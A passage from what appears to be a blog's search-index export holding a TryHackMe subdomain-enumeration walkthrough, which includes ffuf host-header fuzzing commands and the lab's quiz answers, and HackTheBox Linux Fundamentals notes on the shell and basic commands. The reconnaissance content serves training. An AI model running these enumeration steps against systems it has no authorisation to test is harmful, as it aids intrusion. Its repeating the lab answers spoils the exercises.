domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.\nWe will explore three different subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host.\nStart the machine and then move onto the next task.\nQuestions and Answers in the task1. What is a subdomain enumeration method beginning with B?Answer: Brute Force2. What is a subdomain enumeration method beginning with O?Answer: OSINT3. What is a subdomain enumeration method beginning with V?Answer: Virtual Hosts\nTASK 2 - OSINT - SSL&#x2F;TLS CertificatesSSL&#x2F;TLS Certificates\nWhen an SSL&#x2F;TLS (Secure Sockets Layer&#x2F;Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA’s take part in what’s called “Certificate Transparency (CT) logs”. These are publicly accessible logs of every SSL&#x2F;TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like https://crt.sh and https://ui.ctsearch.entrust.com/ui/ctsearchui offer a searchable database of certificates that shows current and historical results.\nGo to crt.sh and search for the domain name tryhackme.com, find the entry that was logged at 2020-12-26 and enter the domain below to answer the question.\nQuestions and Answers in the task1. What domain was logged on crt.sh at 2020-12-26?Answer:\n\nLets visit crt.sh website and search for the records on 2020-12-26\n\n\n\nDomain :  store.tryhackme.com\n\nTASK 3 - OSINT - Search EnginesSearch Engines 🧑‍💻\nSearch engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, “-site:www.domain.com site:*.domain.com” would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.\nGo to Google and use the search term -site:www.tryhackme.com  site:*.tryhackme.com, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.\nQuestions and answers in the task1. What is the TryHackMe subdomain beginning with S discovered using the above Google search?Answer:\n\nGo to google and search for -site:www.tryhackme.com  site:*.tryhackme.com\n\nstore.tryhackme.com\n\nTASK 4 - DNS BruteforceBruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this. Click the “View Site” button to open the static site, press the “Run DNSrecon Request” button to start the simulation, and then answer the question below.\nQuestions and answers in the task1. What is the first subdomain found with the dnsrecon tool?Answers:\n\nclick on view site and the click on run DNSRecon button\nanswer: api.acmeitsupport.thm\n\nTASK 5 - OSINT - Sublist3rAutomation Using Sublist3rTo speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like Sublist3r, click the “View Site” button to open up the static site and run the sublist3r simulation to discover a new subdomain that will help answer the question below.\n**Questions and Answers in the task\n1. What is the first subdomain discovered by sublist3r?Answer:\n\nclick on vew site and then click on Run sublist3r\n\n\n\nanswer: web55.acmeitsupport.thm\n\nTASK 6 - Virtual HostsSome subdomains aren’t always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer’s machines in their &#x2F;etc&#x2F;hosts file (or c:\\windows\\system32\\drivers\\etc\\hosts file for Windows users) which maps domain names to IP addresses. \nBecause web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the Host header. We can utilise this host header by making changes to it and monitoring the response to see if we’ve discovered a new website.\nLike with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.\nStart an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.\nffuf\n1user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP\nThe above command uses the -w switch to specify the wordlist we are going to use. The -H switch adds&#x2F;edits a header (in this instance, the Host header), we have the FUZZ keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.\nBecause the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.ffuf\n1user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://MACHINE_IP -fs &#123;size&#125;\nThis command has a similar syntax to the first apart from the -fs switch, which tells ffuf to ignore any results that are of the specified size.\nThe above command should have revealed two positive results that we haven’t come across before.\nQuestions and Answers in the task1. What is the first subdomain discovered?Answer: \n\nRun the following command to find subdomain \ncommand: ffuf -w namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.186.57 -fs 2395\n\n\n\ndomain: delta\n\n2. What is the second subdomain discovered?Answer: yellow\nThank You 💌Author: Satvik Shetty🧑‍💻See you again in another writeup\n","slug":"THM/WEB/Sub-Domain-Enumeration-THM-Walkthrough","date":"2024-05-28T12:45:16.000Z","categories_index":"cybersecurity,THM,web","tags_index":"tryhackme,web","author_index":"Satvik"},{"id":"4c017bf823830f33adecd64aa365ea2f","title":"Linux Fundamentals Module - HTB","content":"Linux StructureHistoryMany events led up to creating the first Linux kernel and, ultimately, the Linux operating system (OS), starting with the Unix operating system’s release by Ken Thompson and Dennis Ritchie (whom both worked for AT&amp;T at the time) in 1970. The Berkeley Software Distribution (BSD) was released in 1977, but since it contained the Unix code owned by AT&amp;T, a resulting lawsuit limited the development of BSD. Richard Stallman started the GNU project in 1983. His goal was to create a free Unix-like operating system, and part of his work resulted in the GNU General Public License (GPL) being created. Projects by others over the years failed to result in a working, free kernel that would become widely adopted until the creation of the Linux kernel.\nAt first, Linux was a personal project started in 1991 by a Finnish student named Linus Torvalds. His goal was to create a new, free operating system kernel. Over the years, the Linux kernel has gone from a small number of files written in C under licensing that prohibited commercial distribution to the latest version with over 23 million source code lines (comments excluded), licensed under the GNU General Public License v2.\nLinux is available in over 600 distributions (or an operating system based on the Linux kernel and supporting software and libraries). Some of the most popular and well-known being Ubuntu, Debian, Fedora, OpenSUSE, elementary, Manjaro, Gentoo Linux, RedHat, and Linux Mint.\nLinux is generally considered more secure than other operating systems, and while it has had many kernel vulnerabilities in the past, it is becoming less and less frequent. It is less susceptible to malware than Windows operating systems and is very frequently updated. Linux is also very stable and generally affords very high performance to the end-user. However, it can be more difficult for beginners and does not have as many hardware drivers as Windows.\nSince Linux is free and open-source, the source code can be modified and distributed commercially or non-commercially by anyone. Linux-based operating systems run on servers, mainframes, desktops, embedded systems such as routers, televisions, video game consoles, and more. The overall Android operating system that runs on smartphones and tablets is based on the Linux kernel, and because of this, Linux is the most widely installed operating system.\nLinux is an operating system like Windows, iOS, Android, or macOS. An OS is software that manages all of the hardware resources associated with our computer. That means that an OS manages the whole communication between software and hardware. Also, there exist many different distributions (distro). It is like a version of Windows operating systems.\nWith the interactive instances, we get access to the Pwnbox, a customized version of Parrot OS. This will be the primary OS we will work with through the modules. Parrot OS is a Debian-based Linux distribution that focuses on security, privacy, and development.\nPhilosophyLinux follows five core principles:\n\n\n\nPrinciple\nDescription\n\n\n\nEverything is a file\nAll configuration files for the various services running on the Linux operating system are stored in one or more text files.\n\n\nSmall, single-purpose programs\nLinux offers many different tools that we will work with, which can be combined to work together.\n\n\nAbility to chain programs together\nThe integration and combination of different tools enable us to carry out many large and complex tasks, such as processing or filtering specific data results.\n\n\nAvoid captive user interfaces\nLinux is designed to work mainly with the shell (or terminal), which gives the user greater control over the operating system.\n\n\nConfiguration data stored in a text file\nAn example of such a file is the &#x2F;etc&#x2F;passwd file, which stores all users registered on the system.\n\n\nComponents\n\n\nComponent\nDescription\n\n\n\nBootloader\nA piece of code that runs to guide the booting process to start the operating system. Parrot Linux uses the GRUB Bootloader.\n\n\nOS Kernel\nThe kernel is the main component of an operating system. It manages the resources for system’s I&#x2F;O devices at the hardware level.\n\n\nDaemons\nBackground services are called “daemons” in Linux. Their purpose is to ensure that key functions such as scheduling, printing, and multimedia are working correctly. These small programs load after we booted or log into the computer.\n\n\nOS Shell\nThe operating system shell or the command language interpreter (also known as the command line) is the interface between the OS and the user. This interface allows the user to tell the OS what to do. The most commonly used shells are Bash, Tcsh&#x2F;Csh, Ksh, Zsh, and Fish.\n\n\nGraphics server\nThis provides a graphical sub-system (server) called “X” or “X-server” that allows graphical programs to run locally or remotely on the X-windowing system.\n\n\nWindow Manager\nAlso known as a graphical user interface (GUI). There are many options, including GNOME, KDE, MATE, Unity, and Cinnamon. A desktop environment usually has several applications, including file and web browsers. These allow the user to access and manage the essential and frequently accessed features and services of an operating system.\n\n\nUtilities\nApplications or utilities are programs that perform particular functions for the user or another program.\n\n\nLinux ArchitectureThe Linux operating system can be broken down into layers:\n\n\n\nLayer\nDescription\n\n\n\nHardware\nPeripheral devices such as the system’s RAM, hard drive, CPU, and others.\n\n\nKernel\nThe core of the Linux operating system whose function is to virtualize and control common computer hardware resources like CPU, allocated memory, accessed data, and others. The kernel gives each process its own virtual resources and prevents&#x2F;mitigates conflicts between different processes.\n\n\nShell\nA command-line interface (CLI), also known as a shell that a user can enter commands into to execute the kernel’s functions.\n\n\nSystem Utility\nMakes available to the user all of the operating system’s functionality.\n\n\nFile System HierarchyThe Linux operating system is structured in a tree-like hierarchy and is documented in the Filesystem Hierarchy Standard (FHS). Linux is structured with the following standard top-level directories:\n\n\n\n\nPath\nDescription\n\n\n\n&#x2F;\nThe top-level directory is the root filesystem and contains all of the files required to boot the operating system before other filesystems are mounted as well as the files required to boot the other filesystems. After boot, all of the other filesystems are mounted at standard mount points as subdirectories of the root.\n\n\n&#x2F;bin\nContains essential command binaries.\n\n\n&#x2F;boot\nConsists of the static bootloader, kernel executable, and files required to boot the Linux OS.\n\n\n&#x2F;dev\nContains device files to facilitate access to every hardware device attached to the system.\n\n\n&#x2F;etc\nLocal system configuration files. Configuration files for installed applications may be saved here as well.\n\n\n&#x2F;home\nEach user on the system has a subdirectory here for storage.\n\n\n&#x2F;lib\nShared library files that are required for system boot.\n\n\n&#x2F;media\nExternal removable media devices such as USB drives are mounted here.\n\n\n&#x2F;mnt\nTemporary mount point for regular filesystems.\n\n\n&#x2F;opt\nOptional files such as third-party tools can be saved here.\n\n\n&#x2F;root\nThe home directory for the root user.\n\n\n&#x2F;sbin\nThis directory contains executables used for system administration (binary system files).\n\n\n&#x2F;tmp\nThe operating system and many programs use this directory to store temporary files. This directory is generally cleared upon system boot and may be deleted at other times without any warning.\n\n\n&#x2F;usr\nContains executables, libraries, man files, etc.\n\n\n&#x2F;var\nThis directory contains variable data files such as log files, email in-boxes, web application related files, cron files, and more.\n\n\nLinux DistributionsLinux DistributionsLinux distributions - or distros - are operating systems based on the Linux kernel. They are used for various purposes, from servers and embedded devices to desktop computers and mobile phones. Each Linux distribution is different, with its own set of features, packages, and tools. Some popular examples include:\n\nUbuntu\nFedora\nCentOS\nDebian\nRed Hat Enterprise Linux\n\nMany users choose Linux for their desktop computers because it is free, open source, and highly customizable. Ubuntu and Fedora are two popular choices for desktop Linux and beginners. It is also widely used as a server operating system because it is secure, stable, and reliable and comes with frequent and regular updates. Finally, we, as cybersecurity specialists, often prefer Linux because it is open source, meaning its source code is available for scrutiny and customization. Because of such customization, we can optimize and customize our Linux distribution the way we want and configure it for specific use cases only if necessary.\nWe can use those distros everywhere, including (web) servers, mobile devices, embedded systems, cloud computing, and desktop computing. For cyber security specialists, some of the most popular Linux distributions are but are not limited to:\n\n\n\n\n\n\n\n\n\nParrotOS\t&gt; Ubuntu\t&gt; DebianRaspberry Pi OS\t&gt; CentOS\t&gt; BackBoxBlackArch\t&gt; Pentoo\nThe main differences between the various Linux distributions are the included packages, the user interface, and the tools available. Kali Linux is the most popular distribution for cyber security specialists, including a wide range of security-focused tools and packages. Ubuntu is widespread for desktop users, while Debian is popular for servers and embedded systems. Finally, red Hat Enterprise Linux and CentOS are popular for enterprise-level computing.\nDebianDebian is a widely used and well-respected Linux distribution known for its stability and reliability. It is used for various purposes, including desktop computing, servers, and embedded system. It uses an Advanced Package Tool (apt) package management system to handle software updates and security patches. The package management system helps keep the system up-to-date and secure by automatically downloading and installing security updates as soon as they are available. This can be executed manually or set up automatically.\nDebian can have a steeper learning curve than other distributions, but it is widely regarded as one of the most flexible and customizable Linux distros. The configuration and setup can be complex, but it also provides excellent control over the system, which can be good for advanced users. The more control we have over a Linux system, the more complex it feels to become. However, it just feels that way compared to the options and possibilities we get. Without learning it with the required depth, we might spend way more time configuring “easy” tasks and processes than when we would learn to use a few commands and tools more in-depth. We will see it in the Filter Contents and Find Files and Directories sections.\nStability and reliability are key strengths of Debian. The distribution is known for its long-term support releases, which can provide updates and security patches for up to five years. This can be especially important for servers and other systems that must be up and running 24&#x2F;7. It has had some vulnerabilities, but the development community has quickly released patches and security updates. In addition, Debian has a strong commitment to security and privacy, and the distribution has a well-established security track record. Debian is a versatile and reliable Linux distribution that is widely used for a range of purposes. Its stability, reliability, and commitment to security make it an attractive choice for various use cases, including cyber security.\nIntroduction to ShellIntroduction to ShellIt is crucial to learn how to use the Linux shell, as there are many servers based on Linux. These are often used because Linux is less error-prone as opposed to Windows servers. For example, web servers are often based on Linux. Knowing how to use the operating system to control it effectively requires understanding and mastering Linux’s essential part, the Shell. When we first switched from Windows to Linux, does it look something like this:\n\nA Linux terminal, also called a shell or command line, provides a text-based input&#x2F;output (I&#x2F;O) interface between users and the kernel for a computer system. The term console is also typical but does not refer to a window but a screen in text mode. In the terminal window, commands can be executed to control the system.\nWe can think of a shell as a text-based GUI in which we enter commands to perform actions like navigating to other directories, working with files, and obtaining information from the system but with way more capabilities.\nTerminal EmulatorsTerminal emulation is software that emulates the function of a terminal. It allows the use of text-based programs within a graphical user interface (GUI). There are also so-called command-line interfaces (CLI) that run as additional terminals in one terminal. In short, a terminal serves as an interface to the shell interpreter.\nTerminal emulators and multiplexers are beneficial extensions for the terminal. They provide us with different methods and functions to work with the terminal, such as splitting the terminal into one window, working in multiple directories, creating different workspaces, and much more. An example of the use of such a multiplexer called Tmux could look something like this:\n\nShellThe most commonly used shell in Linux is the Bourne-Again Shell (BASH), and is part of the GNU project. Everything we do through the GUI we can do with the shell. The shell gives us many more possibilities to interact with programs and processes to get information faster. Besides, many processes can be easily automated with smaller or larger scripts that make manual work much easier.\nBesides Bash, there also exist other shells like Tcsh&#x2F;Csh, Ksh, Zsh, Fish shell and others.\nPrompt DescriptionPrompt DescriptionThe bash prompt is easy to understand and, by default, includes information such as the user, hostname, and current working directory. It is a string of characters displayed on the terminal screen that indicates that the system is ready for our input. It typically includes information such as the current user, the computer’s hostname, and the current working directory. The prompt is usually displayed on a new line, and the cursor is positioned after the prompt, ready for the user to start typing a command.\nIt can be customized to provide useful information to the user. The format can look something like this: Prompt Description\n1&lt;username&gt;@&lt;hostname&gt;&lt;current working directory&gt;$\nThe home directory for a user is marked with a tilde &lt;~&gt; and is the default folder when we log in.Prompt Description\n@[~]$12345```The dollar sign, in this case, stands for a user. As soon as we log in as root, the character changes to a hash &lt;#&gt; and looks like this:Prompt Description``` bashroot@htb[/htb]#\nFor example, when we upload and run a shell on the target system, we may not see the username, hostname, and current working directory. This may be due to the PS1 variable in the environment not being set correctly. In this case, we would see the following prompts:\n\nUnprivileged - User Shell PromptPrompt Description\n1$\n\nPrivileged - Root Shell PromptPrompt Description\n1#\nIn addition to providing basic information like the current user and working directory, we can customize to display other information in the prompt, such as the IP address, date, time, the exit status of the last command, and more. This is especially useful for us during our penetration tests because we can use various tools and possibilities like script or the .bash_history to filter and print all the commands we used and sort them by date and time. For example, the prompt could be set to display the full path of the current working directory instead of just the current directory name, which can also include the target’s IP address if we work organized.\n\n\nThe prompt can be customized using special characters and variables in the shell’s configuration file (.bashrc for the Bash shell). For example, we can use: the \\u character to represent the current username, \\h for the hostname, and \\w for the current working directory.\n12345678910111213Special Character\tDescription\\d\tDate (Mon Feb 6)\\D&#123;%Y-%m-%d&#125;\tDate (YYYY-MM-DD)\\H\tFull hostname\\j\tNumber of jobs managed by the shell\\n\tNewline\\r\tCarriage return\\s\tName of the shell\\t\tCurrent time 24-hour (HH:MM:SS)\\T\tCurrent time 12-hour (HH:MM:SS)\\@\tCurrent time\\u\tCurrent username\\w\tFull path of the current working directory\nCustomizing the prompt can be a useful way to make your terminal experience more personalized and efficient. It can also be a helpful tool for troubleshooting and problem-solving, as it can provide important information about the system’s state at any given time.\nIn addition to customizing the prompt, we can customize their terminal environment with different color schemes, fonts, and other settings to make their work environment more visually appealing and easier to use.\nHowever, we see the same as when working on the Windows GUI here. We are logged in as a user on a computer with a specific name, and we know which directory we are in when we navigate through our system. Bash prompt can also be customized and changed to our own needs. The adjustment of the bash prompt is outside the scope of this module. However, we can look at the bash-prompt-generator and powerline, which gives us the possibility to adapt our prompt to our needs.\nGetting HelpGetting HelpWe will always stumble across tools whose optional parameters we do not know from memory or tools we have never seen before. Therefore it is vital to know how we can help ourselves to get familiar with those tools. The first two ways are the man pages and the help functions. It is always a good idea to familiarize ourselves with the tool we want to try first. We will also learn some possible tricks with some of the tools that we thought were not possible. In the man pages, we will find the detailed manuals with detailed explanations.\nSyntax:Getting Help\n1satvikbash@htb[/htb]$ man &lt;tool&gt;\n\nLet us have a look at an example:\nExample:\n\nGetting Help1satvikbash@htb[/htb]$ man curl\nGetting Help1234567891011121314151617curl(1)                                                             Curl Manual                                                            curl(1)NAME       curl - transfer a URLSYNOPSIS       curl [options] [URL...]DESCRIPTION       curl  is  a tool to transfer data from or to a server, using one of the supported protocols (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS,         IMAP, IMAPS,  LDAP,  LDAPS,  POP3,  POP3S,  RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET, and TFTP). The command is designed to work without user interaction.       curl offers a busload of useful tricks like proxy support, user authentication, FTP upload, HTTP post, SSL connections, cookies, file transfer resume, Metalink,  and more. As we will see below, the number of features will make our head spin!       curl is powered by libcurl for all transfer-related features.  See libcurl(3) for details.Manual page curl(1) line 1 (press h for help or q to quit)\n\nAfter looking at some examples, we can also quickly look at the optional parameters without browsing through the complete documentation. We have several ways to do that.\n\nSyntax:Getting Help1satvikbash@htb[/htb]$ &lt;tool&gt; --help\nExample:Getting Help1234567891011satvikbash@htb[/htb]$ curl --helpUsage: curl [options...] &lt;url&gt;     --abstract-unix-socket &lt;path&gt; Connect via abstract Unix domain socket     --anyauth       Pick any authentication method -a, --append        Append to target file when uploading     --basic         Use HTTP Basic Authentication     --cacert &lt;file&gt; CA certificate to verify peer against     --capath &lt;dir&gt;  CA directory to verify peer against -E, --cert &lt;certificate[:password]&gt; Client certificate file and password&lt;SNIP&gt;\nWe can also use the short version of it:\n\nSyntax:  Getting Help  1satvikbash@htb[/htb]$ &lt;tool&gt; -h\n\nExample:Getting Help1234567891011satvikbash@htb[/htb]$ curl -hUsage: curl [options...] &lt;url&gt;     --abstract-unix-socket &lt;path&gt; Connect via abstract Unix domain socket     --anyauth       Pick any authentication method -a, --append        Append to target file when uploading     --basic         Use HTTP Basic Authentication     --cacert &lt;file&gt; CA certificate to verify peer against     --capath &lt;dir&gt;  CA directory to verify peer against -E, --cert &lt;certificate[:password]&gt; Client certificate file and password&lt;SNIP&gt;\nAs we can see, the results from each other do not differ in this example. Another tool that can be useful in the beginning is apropos. Each manual page has a short description available within it. This tool searches the descriptions for instances of a given keyword.\n\nSyntax:  Getting Help\n1satvikbash@htb[/htb]$ apropos &lt;keyword&gt;\n\nExample:Getting Help12345678910satvikbash@htb[/htb]$ apropos sudosudo (8)             - execute a command as another usersudo.conf (5)        - configuration for sudo front endsudo_plugin (8)      - Sudo Plugin APIsudo_root (8)        - How to run administrative commandssudoedit (8)         - execute a command as another usersudoers (5)          - default sudo security policy pluginsudoreplay (8)       - replay sudo session logsvisudo (8)           - edit the sudoers file\nAnother useful resource to get help if we have issues to understand a long command is: https://explainshell.com/\n\nSystem InformationSince we will be working with many different Linux systems, we needto learn the structure and the information about the system, itsprocesses, network configurations, users, directories, user settings,and the corresponding parameters. Here is a list of the necessary toolsthat will help us get the above information. Most of them are installedby default.\n\n\n\nCommand\nDescription\n\n\n\nwhoami\nDisplays current username.\n\n\nid\nReturns users identity\n\n\nhostname\nSets or prints the name of current host system.\n\n\nuname\nPrints basic information about the operating system name and system hardware.\n\n\npwd\nReturns working directory name.\n\n\nifconfig\nThe ifconfig utility is used to assign or to view an address to a\n\n\nnetwork interface and&#x2F;or configure network interface parameters.\n\n\n\nip\nIp is a utility to show or manipulate routing, network devices, interfaces and tunnels.\n\n\nnetstat\nShows network status.\n\n\nss\nAnother utility to investigate sockets.\n\n\nps\nShows process status.\n\n\nwho\nDisplays who is logged in.\n\n\nenv\nPrints environment or sets and executes command.\n\n\nlsblk\nLists block devices.\n\n\nlsusb\nLists USB devices\n\n\nlsof\nLists opened files.\n\n\nlspci\nLists PCI devices.\n\n\nLet us look at a few examples.\nHostnameThe hostname command is pretty self-explanatory and will just print the name of the computer that we are logged into\n12satvik@htb[/htb]$ hostnamenixfund\n\nWhoamiThis quick and easy command can be used on both Windows and Linuxsystems to get our current username. During a security assessment, weobtain reverse shell access on a host, and one of the first bits ofsituational awareness we should do is figuring out what user we arerunning as. From there, we can figure out if the user has any specialprivileges&#x2F;access.\n12cry0l1t3@htb[/htb]$ whoamicry0l1t3\n\nIdThe id command expands on the whoamicommand and prints out our effective group membership and IDs. This canbe of interest to penetration testers looking to see what access a usermay have and sysadmins looking to audit account permissions and groupmembership. In this output, the hackthebox group is of interest because it is non-standard, the adm group means that the user can read log files in /var/log and could potentially gain access to sensitive information, membership in the sudo group is of particular interest as this means our user can run some or all commands as the all-powerful root user. Sudo rights could help us escalate privileges or could be a signto a sysadmin that they may need to audit permissions and groupmemberships to remove any access that is not required for a given userto carry out their day-to-day tasks.\n12cry0l1t3@htb[/htb]$ iduid=1000(cry0l1t3) gid=1000(cry0l1t3) groups=1000(cry0l1t3),1337(hackthebox),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)\n\nUnameLet’s dig into the uname command a bit more. If we type man uname in our terminal, we will bring up the man page for the command, whichwill show the possible options we can run with the command and theresults.\n123456789101112131415161718192021222324252627282930313233343536373839404142434445UNAME(1)                                    User Commands                                   UNAME(1)NAME       uname - print system informationSYNOPSIS       uname [OPTION]...DESCRIPTION       Print certain system information.  With no OPTION, same as -s.       -a, --all              print all information, in the following order, except omit -p and -i if unknown:       -s, --kernel-name              print the kernel name       -n, --nodename              print the network node hostname       -r, --kernel-release              print the kernel release       -v, --kernel-version              print the kernel version       -m, --machine              print the machine hardware name       -p, --processor              print the processor type (non-portable)       -i, --hardware-platform              print the hardware platform (non-portable)       -o, --operating-system``` bashRunning `uname -a` will print all information about the machine in a specific order: kernel name, hostname, the kernel release, kernel version, machine hardware name, and operating system. The `-a` flag will omit `-p` (processor type) and `-i` (hardware platform)  if they are unknown.``` bashcry0l1t3@htb[/htb]$ uname -aLinux box 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n\nFrom the above command, we can see that the kernel name is Linux, the hostname is box, the kernel release is 4.15.0-99-generic, the kernel version is #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020, and so on. Running any of these options on their own will give us the specific bit output we are interested in.\nUname to Obtain Kernel ReleaseSuppose we want to print out the kernel release to search for potential kernel exploits quickly. We can type uname -r to obtain this information.\n12cry0l1t3@htb[/htb]$ uname -r4.15.0-99-generic\n\nWith this info, we could go and search for “4.15.0-99-generic exploit,” and the first  result immediately appears useful to us.\nIt is highly recommended to study the commands and understand whatthey are for and what information they can provide. Though a bittedious, we can learn much from studying the manpages for commoncommands. We may even find out things that we did not even know werepossible with a given command. This information is not only used forworking with Linux. However, it will also be used later to discovervulnerabilities and misconfigurations on the Linux system that maycontribute to privilege escalation. Here are a few optional exercisesthat we can solve for practice purposes, which will help us becomefamiliar with some of the commands.\nLogging In via SSHSecure Shell (SSH) refers to a protocolthat allows clients to access and execute commands or actions on remotecomputers. On Linux-based hosts and servers running or another Unix-like operating system, SSH is one of the permanently installed standardtools and is the preferred choice for many administrators to configureand maintain a computer through remote access. It is an older and veryproven protocol that does not require or offer a graphical userinterface (GUI). For this reason, it works very efficiently and occupies very few resources. We use this type of connection in the followingsections and in most of the other modules to offer the possibility totry out the learned commands and actions in a safe environment. We canconnect to our targets with the following command:\nSSH Login1satvikbash@htb[/htb]$ ssh [username]@[IP address]\n\nNavigationNavigation is essential, like working with the mouse as a standardWindows user. With it, we move across the system and work in directories and with files, we need and want. Therefore, we use different commandsand tools to print out information about a directory or a file and canuse advanced options to optimize the output to our needs.\nOne of the best ways to learn something new is to experiment with it. Here we cover the sections on navigating through Linux, creating,moving, editing, and deleting files and folders, finding them on theoperating system, different types of redirects, and what filedescriptors are. We will also find shortcuts to make our work with theshell much easier and more comfortable. We recommend experimenting onour locally hosted VM. Ensure we have created a snapshot for our VM incase our system gets unexpectedly damaged.\nLet us start with the navigation. Before we move through the system,we have to find out in which directory we are. We can find out where weare with the command pwd.\n12cry0l1t3@htb[~]$ pwd/home/cry0l1t3\n\nOnly the ls command is needed to list all the contentsinside a directory. It has many additional options that can complementthe display of the content in the current folder.\n12cry0l1t3@htb[~]$ lsDesktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos\n\nUsing it without any additional options will display the directories and files only. However, we can also add the -l option to display more information on those directories and files.\n12345678910cry0l1t3@htb[~]$ ls -ltotal 32drwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 Desktopdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Documentsdrwxr-xr-x 3 cry0l1t3 htbacademy 4096 Nov 15 03:26 Downloadsdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Musicdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Picturesdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Publicdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Templatesdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Videos\n\nFirst, we see the total amount of blocks (512-byte) used by the files and directories listed in the current directory, whichindicates the total size used. That means it used 32 * 512-byte &#x3D; 16384 bytes of disk space. Next, we see a few columns that are structured as follows:\n\n\n\nColumn Content\nDescription\n\n\n\ndrwxr-xr-x\nType and permissions\n\n\n2\nNumber of hard links to the file&#x2F;directory\n\n\ncry0l1t3\nOwner of the file&#x2F;directory\n\n\nhtbacademy\nGroup owner of the file&#x2F;directory\n\n\n4096\nSize of the file or the number of blocks used to store the directory information\n\n\nNov 13 17:37\nDate and time\n\n\nDesktop\nDirectory name\n\n\nHowever, we will not see everything that is in this folder. Adirectory can also have hidden files that start with a dot at thebeginning of its name (e.g., .bashrc or .bash_history). Therefore, we need to use the command ls -la to list all files of a directory:\n12345678910111213cry0l1t3@htb[~]$ ls -latotal 403188drwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 .bash_historydrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 .bashrc...SNIP...drwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 Desktopdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Documentsdrwxr-xr-x 3 cry0l1t3 htbacademy 4096 Nov 15 03:26 Downloadsdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Musicdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Picturesdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Publicdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Templatesdrwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:34 Videos\n\nTo list the contents of a directory, we do not necessarily need to navigate there first. We can also use “ls” to specify the path where we want to know the contents.\n12345678cry0l1t3@htb[~]$ ls -l /var/total 52drwxr-xr-x  2 root root     4096 Mai 15 18:54 backupsdrwxr-xr-x 18 root root     4096 Nov 15 16:55 cachedrwxrwsrwt  2 root whoopsie 4096 Jul 25  2018 crashdrwxr-xr-x 66 root root     4096 Mai 15 03:08 libdrwxrwsr-x  2 root staff    4096 Nov 24  2018 local&lt;SNIP&gt;\n\nWe can do the same thing to navigate to the directory. To move through the directories, we use the command cd. Let us change to the /dev/shm directory. Of course, we can go to the /dev directory first and then /shm. Nevertheless, we can also enter the full path and jump there.\n12cry0l1t3@htb[~]$ cd /dev/shmcry0l1t3@htb[/dev/shm]$\n\nSince we were in the home directory before, we can quickly jump back to the directory we were last in.\n12cry0l1t3@htb[/dev/shm]$ cd -cry0l1t3@htb[~]$\n\nThe shell also offers us the auto-complete function, which makes navigation easier. If we now type cd /dev/s and press [TAB] twice, we will get all entries starting with the letter “s” in the directory of /dev/.\n12cry0l1t3@htb[~]$ cd /dev/s [TAB 2x]shm/ snd/\n\nIf we add the letter “h” to the letter “s,” the shell will complete the input since otherwise there will be no folders in this directory beginning with the letters “sh”. If we now display all contents of the directory, we will only see the following contents.\n1234cry0l1t3@htb[/dev/shm]$ ls -la /dev/shmtotal 0drwxrwxrwt  2 root root   40 Mai 15 18:31 .drwxr-xr-x 17 root root 4000 Mai 14 20:45 ..\n\nThe first entry with a single dot (.) indicates the current directory we are currently in. The second entry with two dots (..) represents the parent directory /dev. This means we can jump to the parent directory with the following command.\n12cry0l1t3@htb[/dev/shm]$ cd ..cry0l1t3@htb[/dev]$\n\nSince our shell is filled with some records, we can clean the shell with the command clear. First, however, let us return to the directory /dev/shm before and then execute the clear command to clean up our terminal.\n1cry0l1t3@htb[/dev]$ cd shm &amp;&amp; 